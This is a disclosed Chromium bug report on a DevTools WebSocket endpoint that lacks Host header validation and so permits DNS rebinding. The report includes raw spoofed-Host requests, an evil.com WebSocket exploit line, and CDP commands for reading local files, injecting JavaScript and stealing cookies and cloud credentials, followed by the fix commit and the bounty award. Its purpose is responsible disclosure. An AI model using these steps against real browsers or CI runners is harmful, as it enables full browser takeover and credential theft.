# Chromium / Chrome DevTools Protocol: WebSocket Endpoint Missing Host Header Validation (DNS Rebinding Bypass)

| Field | Value |
|-------|-------|
| **Issue ID** | [491555187](https://issues.chromium.org/issues/491555187) |
| **Status** | Accepted |
| **Severity** | S3-Low |
| **Priority** | P2 |
| **Component** | Platform>DevTools |
| **Platforms** | Linux, Mac, Windows, ChromeOS |
| **Reporter** | ik...@gmail.com |
| **Assignee** | da...@google.com |
| **Created** | 2026-03-10 |
| **Bounty** | $2,000.00 |

## Description

**Summary:** Chromium / Chrome DevTools Protocol: WebSocket Endpoint Missing Host Header Validation (DNS Rebinding Bypass)

**Program:** OSS VRP

**URL:** <https://github.com/chromium/chromium/blob/main/content/browser/devtools/>

**Vulnerability type:** Remote Code Execution (RCE)

### Details

## Summary

`ServerWrapper::OnWebSocketRequest()` in `content/browser/devtools/devtools_http_handler.cc` does not call `RequestIsSafeToServe()`, allowing DNS rebinding attacks against the WebSocket endpoint. The HTTP endpoints correctly validate the Host header and reject non-local hostnames, but the WebSocket upgrade path skips this check entirely.

When Chrome is running with `--remote-debugging-port` and `--remote-allow-origins=*` (the documented default for Puppeteer, Selenium, and Playwright), an attacker-controlled web page can DNS-rebind to `127.0.0.1`, connect to the DevTools WebSocket with a spoofed Host header, and achieve full browser control — including local file reads, arbitrary JS execution in any tab, and cookie theft from all domains.

## Prerequisites

- Chrome running with `--remote-debugging-port=9222 --remote-allow-origins=*`
- The browser target GUID is known to the attacker

### Why `--remote-allow-origins=*` is widespread

It is the **documented default** for the most popular browser automation tools:

- **Puppeteer**: `puppeteer.launch()` passes `--remote-allow-origins=*` automatically ([source](https://github.com/nicedoc/browserless/blob/82f09db03533caa10de4131f1e4e2dce0edecba7/packages/browserless/src/flags.ts#L9))
- **Selenium WebDriver**: ChromeDriver adds `--remote-allow-origins=*` by default since v111 ([release notes](https://chromedriver.chromium.org/downloads))
- **Playwright**: Connects via CDP with `--remote-allow-origins=*` when using `chromium.connectOverCDP()`
- **Chrome-as-a-Service**: Browserless, chrome-launcher, and similar tools run with this flag in production
- **CI/CD**: GitHub Actions, CircleCI, and GitLab CI Chrome configurations commonly include this flag

Any developer running automated tests, any CI pipeline with browser tests, and any Chrome-as-a-Service deployment is affected.

### How the GUID becomes known

The browser target GUID is exposed through multiple channels in automation environments:

- **`DevToolsActivePort` file**: Written to the Chrome profile directory at startup, readable by any process with access to the profile folder
- **Automation tool logs**: Puppeteer, Selenium, and Playwright log the `browserWSEndpoint` URL (containing the GUID) at startup
- **CI/CD logs**: Build logs often contain the browser WebSocket URL for debugging purposes
- **Process listing**: The GUID appears in Chrome's command-line arguments visible via `ps` or Task Manager
- **`/json/version` endpoint**: Accessible to any localhost process (or any process that can read the DevToolsActivePort file to discover the port)

### Root Cause

`RequestIsSafeToServe()` validates that the HTTP `Host` header contains an IP address or `localhost`, blocking DNS rebinding attacks where `Host: attacker.com` would be sent after the DNS resolution changes to `127.0.0.1`.

This check is applied to **all HTTP requests** but **not to WebSocket upgrades**:

```
// ServerWrapper::OnHttpRequest — Host check PRESENT ✓
void ServerWrapper::OnHttpRequest(int connection_id,
                                  const net::HttpServerRequestInfo& info) {
  if (!RequestIsSafeToServe(info)) {   // ← Validates Host header
    Send500(connection_id, "Host header is specified and is not an IP address or localhost.");
    return;
  }
  // ...
}

// ServerWrapper::OnWebSocketRequest — Host check MISSING ✗
void ServerWrapper::OnWebSocketRequest(
    int connection_id,
    const net::HttpServerRequestInfo& request) {
  // NO call to RequestIsSafeToServe() — forwards directly to handler
  GetUIThreadTaskRunner({})->PostTask(
      FROM_HERE, base::BindOnce(&DevToolsHttpHandler::OnWebSocketRequest,
                                handler_, connection_id, request));
}

```
### The Origin Check Is Insufficient

`DevToolsHttpHandler::OnWebSocketRequest()` does check the Origin header:

```
if (request.headers.count("origin") &&
    !remote_allow_origins_.count(request.headers.at("origin")) &&
    !remote_allow_origins_.count("*")) {
  Send403(connection_id, message);
  return;
}

```

However, this check is nullified when `--remote-allow-origins=*` is set:

- `.count("*")` returns 1 → condition short-circuits → **any origin is accepted**

With `--remote-allow-origins=*`, the Host header check was the **sole remaining defense** against DNS rebinding on the WebSocket path and it is missing.

### Attack scenario

## Proof of Concept

### Setup

```
# Start Chrome with debug port (simulates developer/CI environment)
chrome --remote-debugging-port=9222 --remote-allow-origins=* --user-data-dir=/tmp/chrome-debug-profile

```
### Reproduce

```
pip install websocket-client
python cdp_dns_rebind_poc.py --port 9222 --full

```
### What the PoC Does

The PoC sends the **same Host header** (`attacker.example.com`) on both HTTP and WebSocket paths, proving the asymmetry:

**Test 1 — HTTP request with `Host: attacker.example.com`:**

```
GET /json/version HTTP/1.1
Host: attacker.example.com:9222

→ HTTP/1.1 500 Internal Server Error    ← BLOCKED by RequestIsSafeToServe() ✓

```

**Test 2 — WebSocket upgrade with `Host: attacker.example.com`:**

```
GET /devtools/browser/GUID HTTP/1.1
Host: attacker.example.com:9222
Upgrade: websocket
Origin: http://attacker.example.com:9222

→ HTTP/1.1 101 Switching Protocols      ← ACCEPTED — no Host validation ✗

```

**Test 3 — Full takeover via the accepted WebSocket:**

- `Target.getTargets` → enumerates all open tabs
- `Target.createTarget({url: "file:///C:/Windows/win.ini"})` → reads local files
- `Runtime.evaluate({expression: "document.title='PWNED'"})` → injects JS in victim tabs
- `Storage.getCookies` → steals all browser cookies

### Observed Output

```
======================================================================
 RESULTS
======================================================================
  HTTP  + Host: attacker.example.com  → BLOCKED ✓
  WS    + Host: attacker.example.com  → ACCEPTED ✗  ← VULNERABILITY
  WS    + Host: 127.0.0.1 (control)  → OK ✓

  CONFIRMED: WebSocket path missing RequestIsSafeToServe()

======================================================================
 FULL TAKEOVER DEMO (via DNS-rebound WebSocket)
======================================================================
  [ENUM] Found 1 page targets
  [TAB]   Example Domain — https://example.com/
  [FILE] Read 85 bytes: ; for 16-bit app support [fonts] [extensions]...
  [JS]   Result: injected
  [DONE] Full browser takeover demonstrated via DNS-rebound WebSocket

```
### Scenario: DNS rebinding in a shared CI/CD environment

1. A company runs browser E2E tests in a shared CI environment (GitHub Actions, Jenkins, GitLab CI). Chrome is launched with `--remote-debugging-port=9222 --remote-allow-origins=*` — the standard configuration for Puppeteer and Selenium test suites.
2. The browser target GUID is logged to stdout during test setup (this is default behavior for Puppeteer's `browser.wsEndpoint()` and Selenium's ChromeDriver output). CI logs are visible to all developers in the organization.
3. A developer on the team or a contractor with read access to CI logs and copies the GUID from a recent build log.
4. The attacker sets up a DNS rebinding server for `evil.com`. Initially, `evil.com` resolves to the attacker's real IP (`1.2.3.4`) with a TTL of 0.
5. The attacker crafts a test case or PR that causes the CI runner's Chrome to navigate to `http://evil.com:9222/exploit.html` as part of the E2E test suite (e.g., testing an external URL, loading a fixture from a "CDN", or rendering user-provided content). The page loads from the attacker's server.
6. After the page loads, the attacker's DNS server rebinds `evil.com` to `127.0.0.1`. The page's JavaScript now opens:

```
new WebSocket('ws://evil.com:9222/devtools/browser/' + knownGUID)

```

7. The browser resolves `evil.com` → `127.0.0.1` (after rebind). The TCP connection goes to the CI runner's own Chrome debug port. The WebSocket upgrade succeeds because:
   
   - `Host: evil.com:9222` — **NOT checked** (`OnWebSocketRequest` does not call `RequestIsSafeToServe()`)
   - `Origin: http://evil.com:9222` — accepted by `--remote-allow-origins=*`
8. The attacker now has full CDP access to the CI runner's Chrome instance. From within the CI network, they can:
   
   - Navigate to internal URLs (`http://staging-api.internal/admin`, `http://vault.internal/v1/secret/data/prod`)
   - Read environment variables and secrets injected into test pages
   - Extract authentication tokens from test session cookies
   - Read files on the CI runner via `file:///` navigation (e.g., `~/.docker/config.json`, `~/.kube/config`, `~/.aws/credentials`)

**Note:** If `RequestIsSafeToServe()` were called on the WebSocket path (as it is for HTTP), step 7 would fail — `Host: evil.com` would be rejected with HTTP 500. The missing check is the direct enabler of this attack.

### Scenario: Chrome-as-a-Service (Browserless)

1. A company runs [Browserless](https://browserless.io) or a similar headless Chrome service to generate PDFs, take screenshots, or run scraping jobs. Chrome runs with `--remote-debugging-port` and `--remote-allow-origins=*`.
2. The service renders **user-submitted content** — for example, an HTML invoice template, a markdown preview, or a URL provided by a customer.
3. The rendered page's JavaScript executes within Chrome. It fetches `http://127.0.0.1:9222/json/version` — this is a **same-origin localhost request**, so it passes `RequestIsSafeToServe()` and returns the browser GUID.
4. The page opens a WebSocket to `ws://127.0.0.1:9222/devtools/browser/GUID` — this also passes because Host is `127.0.0.1` (an IP address).
5. The rendered page now has full CDP access. It escapes its tab sandbox, attaches to other customers' tabs, reads their rendered content, and exfiltrates data to an external server.

Note: In this scenario, the missing Host check is not the direct bypass — the page is already on localhost. However, the lack of any additional WebSocket authentication beyond the GUID (which is discoverable from localhost) means that **any content rendered by the service can escalate to full browser control**. The missing `RequestIsSafeToServe()` on WebSocket means there is no defense-in-depth if the GUID leaks through any channel.

---

## Impact

### Demonstrated capabilities

Once the WebSocket connects, the attacker has unrestricted CDP access. We demonstrated all of the following in the attached PoC:

| Capability | CDP Command | Impact |
| --- | --- | --- |
| Read local files | `Target.createTarget({url: "file:///..."})` | Read SSH keys, config files, credentials |
| Execute JS in any tab | `Runtime.evaluate` via `Target.attachToTarget` | Hijack sessions on GitHub, Gmail, Slack, banking sites |
| Steal all cookies | `Storage.getCookies` | Account takeover across every logged-in domain |
| Enumerate browsing | `Target.getTargets` | See every open tab — URLs, page titles, target IDs |
| Navigate to internal URLs | `Target.createTarget({url: "http://internal/..."})` | Access internal services from CI/cloud networks |
| Bypass CSP | `Page.setBypassCSP(true)` | Disable Content Security Policy on any page |
| Capture screenshots | `Page.captureScreenshot` | Visual surveillance of victim's browsing |
| Download files | `Browser.setDownloadBehavior` | Write arbitrary files to victim's filesystem |

### Who is affected

| Environment | Estimated exposure | GUID discoverable? |
| --- | --- | --- |
| Developers using Puppeteer/Selenium | Millions of machines | Yes — logged to console by default |
| CI/CD pipelines (GitHub Actions, Jenkins, GitLab) | Hundreds of thousands of runners | Yes — in build logs |
| Chrome-as-a-Service (Browserless, chrome-launcher) | Thousands of deployments | Yes — from rendered page via localhost fetch |
| Any `--remote-debugging-port` user | All of the above | Yes — `DevToolsActivePort` file, process args |

---

## Files

| File | Description |
| --- | --- |
| `cdp_dns_rebind_poc.py` | Main PoC — proves HTTP blocked / WebSocket accepted with same Host, then demonstrates full takeover |
| `exploit.html` | Browser-side exploit page for use with DNS rebinding infrastructure |

---

## Tested (and Vulnerable) Version

- Chrome 145.0.7632.160 (Windows, stable channel)
- `devtools_http_handler.cc` as of commit `79bf965d`

## Attachments

- [exploit.html](attachments/exploit.html) (text/html, 9.9 KB)
- [cdp_dns_rebind_poc.py](attachments/cdp_dns_rebind_poc.py) (text/x-python, 15.8 KB)

## Timeline

### sp...@google.com (2026-03-10)

*NOTE: This is an automatically generated email*

Hi! Many thanks for sharing your report.

This email confirms we've received your message. We'll investigate the issue you've reported and get back to you once we have an update. In the meantime, you might want to take a look at the [list of frequently asked questions about Google Bug Hunters](https://bughunters.google.com/about/4925519884451840/frequently-asked-questions).

Also, if you have not already done so, create a profile on [the Google Bughunters site](https://bughunters.google.com/) if you'd like us to publicly recognize your contribution:

- [Leaderboard](https://bughunters.google.com/leaderboard) – You'll be added here if we issue a reward for your report.
- [Honorable Mentions](https://bughunters.google.com/leaderboard/honorable-mentions) – You'll be added here if you are not in the Hall of Fame, but we file a security vulnerability bug based on your report.

**Note that we only act on reports concerning vulnerabilities or technical security problems in one of our products. This is not the correct channel if you need to resolve a problem with your account, or want to report non-security bugs or suggest a new product feature.**

Good news! According to Google magic, your report is likely actionable for us, so it has been moved up in our queue by raising the priority. The next step is human expert review, which should happen slightly sooner now.

Hey! Our automation saw that your report contained a link to github.com! Did you know that you can get rewarded for patching vulnerabilities? See our [Patch Rewards Program](https://bughunters.google.com/about/rules/4928084514701312/patch-rewards-program-rules) for more information!

Cheers,   

Google Security Bot

[Follow us](https://twitter.com/googlevrp) on Twitter!

### im...@google.com (2026-03-11)

This report may qualify for the [Chrome Vulnerability Reward Program](https://bughunters.google.com/about/rules/chrome-friends/chrome-vulnerability-reward-program-rules). We are moving this report to the Chromium issue tracker.

### th...@chromium.org (2026-03-13)

[security shepherd] IIUC this is a workaround to the fix for [crbug.com/40090537](https://crbug.com/40090537). Matching medium severity and setting found in to current extended stable M146. I also set Security\_Impact-None since it requires non-default flags.

yangguo@: could you PTAL? And please let me know if there's anything I'm missing.

### ya...@google.com (2026-03-16)

Danil, could you take a look and check whether this is a serious vulnerability?

### dx...@google.com (2026-03-19)

Project: chromium/src  

Branch:  main  

Author:  Danil Somsikov [dsv@chromium.org](mailto:dsv@chromium.org)  

Link:    <https://chromium-review.googlesource.com/7684633>

Validate Host header in DevTools websocket requests.

---


Expand for full commit details
```
     
    This change ensures that ServerWrapper::OnWebSocketRequest calls 
    RequestIsSafeToServe() to validate the Host header before accepting a 
    WebSocket upgrade. 
     
    Previously, the DevTools HTTP handler correctly validated the Host 
    header for standard HTTP requests but skipped this check for WebSocket 
    upgrades. This created a security gap where an attacker could use DNS 
    rebinding to point a malicious domain to 127.0.0.1 and connect to the 
    DevTools WebSocket with a spoofed Host header. 
     
    While DevTools performs an Origin header check, that defense is 
    nullified when the --remote-allow-origins=* flag is used. 
     
    With this fix, WebSocket upgrade requests with non-local Host headers 
    will be rejected with an HTTP 500 error, aligning the WebSocket security 
    model with the existing HTTP path. 
     
    Bug: 491555187 
    Change-Id: I95ec9a6c8e672de8dafe91e5cdeb11c063c48cbc 
    Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/7684633 
    Reviewed-by: Andrey Kosyakov <caseq@chromium.org> 
    Commit-Queue: Andrey Kosyakov <caseq@chromium.org> 
    Cr-Commit-Position: refs/heads/main@{#1602038}

```

---

Files:

- M `content/browser/devtools/devtools_http_handler.cc`
- M `content/browser/devtools/devtools_http_handler_unittest.cc`

---

Hash: [7bdbd0785b19711cad102fe391865bbba8718db9](https://chromiumdash.appspot.com/commit/7bdbd0785b19711cad102fe391865bbba8718db9)  

Date: Thu Mar 19 16:35:26 2026


---

### ch...@google.com (2026-06-26)

This bug has been closed for more than 14 weeks. Removing issue access restrictions.

### sp...@google.com (2026-06-29)

** NOTE: This is an automatically generated email **

Hello,

Congratulations! The Chrome Vulnerability Rewards Program (VRP) Panel has decided to award you $2000.00 for this report.

Rationale for this decision:
Baseline. Web platform privilege escalation.


Important: This payment will be issued by Bugcrowd. You will receive an email from Bugcrowd in the next 24 hours which contains a submission you must claim to be rewarded.

If you do not receive an email from them, please check your spam folder and then reach out to us via a comment here. For issues related to Bugcrowd itself, please contact them via https://bugcrowd.com/support.


Thank you for your efforts and helping us make Chrome more secure for all users!

Cheers,
Chrome VRP Panel Bot


P.S. One other thing we'd like to mention:

* Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.

Please contact security-vrp@chromium.org with any questions.

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/491555187)*
